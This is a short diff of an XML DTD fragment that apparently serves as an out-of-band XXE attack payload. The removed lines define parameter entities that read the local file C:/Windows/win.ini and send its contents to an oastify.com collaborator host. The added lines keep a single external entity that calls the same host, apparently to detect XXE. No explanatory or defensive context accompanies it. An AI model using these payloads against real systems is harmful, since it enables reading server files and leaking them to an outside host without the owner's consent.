@@ -1,3 +1,2 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % send SYSTEM "http://k3oxushregaphrw43ievhnmia9g74xsm.oastify.com/?x=%file;">
-%send;
+<!ENTITY % payload SYSTEM "http://k3oxushregaphrw43ievhnmia9g74xsm.oastify.com">
+%payload;
